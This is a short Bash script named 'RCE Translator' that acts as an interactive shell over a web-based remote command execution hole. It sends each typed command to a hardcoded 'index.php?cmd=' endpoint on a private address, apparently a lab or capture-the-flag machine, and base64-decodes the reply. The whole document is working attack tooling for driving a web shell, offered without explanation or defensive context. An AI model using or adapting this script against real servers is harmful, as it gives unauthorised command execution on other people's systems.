#!/bin/bash

# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"

dependencies=("figlet" "lolcat" "curl" "base64")

for dep in "${dependencies[@]}"; do
    if ! command -v "$dep" &>/dev/null; then
        echo -e "${redColour}Error: $dep is not installed.${endColour}"
        exit 1
    fi
done

# Banner
figlet -f slant "RCE Translator" | lolcat
echo -e "${greenColour}Created by: Samuel Laveau (aka Ne4rby)${endColour}\n"

# Handle Ctrl+C
trap ctrl_c INT
ctrl_c() {
    echo -e "\n${redColour}[!] Exiting...${endColour}"
    exit 1
}


URL="http://10.10.81.200/assets/index.php?cmd="


while true; do

	echo -ne "${blueColour}CMD-> ${endColour}"
	read command
	if [[ "$command" == "exit" || "$command" == "quit" ]]; then
  		echo -e "${redColour}[!] Exiting...${endColour}"
    		break
fi
	decoded_output=$(curl -s $URL$command | base64 -d)
	echo $decoded_output
done
